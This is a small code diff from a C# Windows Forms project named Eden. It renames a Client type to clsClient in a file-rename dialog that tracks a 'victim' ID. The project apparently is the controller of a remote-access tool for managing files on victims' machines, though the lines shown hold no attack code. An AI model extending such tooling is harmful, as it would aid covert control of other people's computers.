@@ -13,13 +13,13 @@ namespace Eden
 {
     public partial class frmFileRename : Form
     {
-        public Client m_clnt;
+        public clsClient m_clnt;
         public string szVictimID;
 
         public string m_szEntryName;
         public bool m_bDirectory;
 
-        void Received(Client clnt, string szVictimID, string[] aMsg)
+        void Received(clsClient clnt, string szVictimID, string[] aMsg)
         {
             if (this.szVictimID != szVictimID)
                 return;
